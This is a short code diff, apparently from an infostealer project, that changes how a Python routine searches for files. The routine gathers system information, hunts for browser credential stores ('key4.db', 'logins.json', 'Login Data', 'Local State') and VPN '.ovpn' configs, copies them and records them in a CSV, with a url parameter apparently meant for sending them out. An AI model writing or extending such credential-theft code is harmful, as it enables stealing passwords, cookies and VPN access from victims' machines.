@@ -9,8 +9,7 @@ def main(url):
     system_information = utils.system_information()
     csv_manager.init()
     search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']
-    search_files_regex = '|'.join([re.escape(file) for file in search_files])
-    files = filemanager.search_files(search_files_regex)
+    files = filemanager.search_files(search_files)
     filenames = filemanager.copy_files(files)
     csv_manager.add_rows(filenames)
     # url is not None AND url is not empty or blank
